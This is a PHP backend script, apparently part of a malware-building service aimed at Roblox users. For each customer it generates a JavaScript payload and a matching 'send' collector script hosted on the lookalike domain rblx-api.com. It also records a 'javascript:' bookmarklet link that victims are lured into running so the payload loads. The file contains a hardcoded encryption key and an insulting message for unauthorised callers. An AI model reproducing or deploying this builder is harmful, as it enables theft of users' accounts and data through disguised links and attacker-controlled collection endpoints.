<?php
    require_once 'config.php';

    if(!empty($_POST['Security']) || !empty($_POST['jsID']) || !empty($_POST['jsName']) || !empty($_POST['isPrompt']) || !empty($_POST['msgPrompt']) || !empty($_POST['folderName']) || !empty($_POST['identify'])){

      $hash = decrypt(htmlspecialchars($_POST['Security']));
      $jsID = decrypt(htmlspecialchars($_POST['jsID']));
      $js = decrypt(htmlspecialchars($_POST['jsName']));
      $isPrompt = decrypt(htmlspecialchars($_POST['isPrompt']));
      $prompttext = decrypt(htmlspecialchars($_POST['msgPrompt']));
      $folder = decrypt(htmlspecialchars($_POST['folderName']));
      $identify = decrypt(htmlspecialchars($_POST['identify']));

      for ($i=0; $i < 15; $i++) { 
  
          if (hash('sha256', '877692' . UnixTimeStamp() - $i) == $hash){
  
            if (!file_exists("l/$folder")){

                mkdir('l/' . $folder, 0755, true);

                $str=file_get_contents("stub/linkFiles/sendfunction.txt");
                $str=str_replace('#identify', $identify, $str);
                file_put_contents("l/$folder/send-$js.php", $str);
            
                if($isPrompt == "true"){

                    $str=file_get_contents("stub/linkFiles/payloadprompt.txt");
                    $str=str_replace('#sendphp', "https://rblx-api.com/l/$folder/send-$js.php", $str);
                    $str=str_replace('#text', $prompttext, $str);
                    if (!empty($_POST['texturesCheck'])){
                      $str=str_replace('#ghuidfg', "true", $str);
                    }else{
                      $str=str_replace('#ghuidfg', "false", $str);
                    }
                    file_put_contents("l/$folder/$js.js", $str);

                }else{

                    $str=file_get_contents("stub/linkFiles/payload.txt");
                    $str=str_replace('#sendphp', "https://rblx-api.com/l/$folder/send-$js.php", $str);
                    if (!empty($_POST['texturesCheck'])){
                      $str=str_replace('#ghuidfg', "true", $str);
                    }else{
                      $str=str_replace('#ghuidfg', "false", $str);
                    }
                    file_put_contents("l/$folder/$js.js", $str);
                }

                $PDOLog = $db -> prepare('INSERT INTO `js_logs` VALUES(:userid, :link, :name, :folder, :id, :date)');
                $PDOLog -> execute(array(':userid' => htmlspecialchars($identify), ':link' =>  "Javascript:$.get('//rblx-api.com/l/$folder/$js.js')",':name' => $js, ':folder' => $folder, ':id' => $jsID, ':date' => date("Y-m-d H:i:s")));
            }
            else{
                echo encrypt("FOLDERNAME_TAKEN");
            }
          }else{
            echo "You just got beamed you fucking loser";
          }
      }
    }else{
      header("Location: https://discord.ixwhere.com");
      exit();
    }
    function getID($length){
      $token = "";
      $codeAlphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
      $codeAlphabet.= "abcdefghijklmnopqrstuvwxyz";
      $codeAlphabet.= "0123456789";
      $max = strlen($codeAlphabet);
 
     for ($i=0; $i < $length; $i++) {
         $token .= $codeAlphabet[random_int(0, $max-1)];
     }
 
     return $token;
    }
    function randomNumber($length) {
        $result = '';
    
        for($i = 0; $i < $length; $i++) {
            $result .= mt_rand(0, 9);
        }
    
        return $result;
    }
    function UnixTimeStamp(){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://ixwhere.online/UT");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $unix = curl_exec($ch);
        curl_close($ch);
        echo $unix;
    }

    function encrypt($message)
    {
        if (OPENSSL_VERSION_NUMBER <= 268443727) {
            throw new RuntimeException('OpenSSL Version too old, vulnerability to Heartbleed');
        }
        
        $iv_size        = openssl_cipher_iv_length('aes-256-cbc');
        $iv             = openssl_random_pseudo_bytes($iv_size);
        $ciphertext     = openssl_encrypt($message, 'aes-256-cbc', "Z8ZW4nRUDC8wbBDqYSG5rJY8Advtar7X", OPENSSL_RAW_DATA, $iv);
        $ciphertext_hex = bin2hex($ciphertext);
        $iv_hex         = bin2hex($iv);
        return "$iv_hex:$ciphertext_hex";
    }
    function decrypt($ciphered) {
        $iv_size    = openssl_cipher_iv_length('aes-256-cbc');
        $data       = explode(":", $ciphered);
        $iv         = hex2bin($data[0]);
        $ciphertext = hex2bin($data[1]);
        return openssl_decrypt($ciphertext, 'aes-256-cbc', "Z8ZW4nRUDC8wbBDqYSG5rJY8Advtar7X", OPENSSL_RAW_DATA, $iv);
    }
?>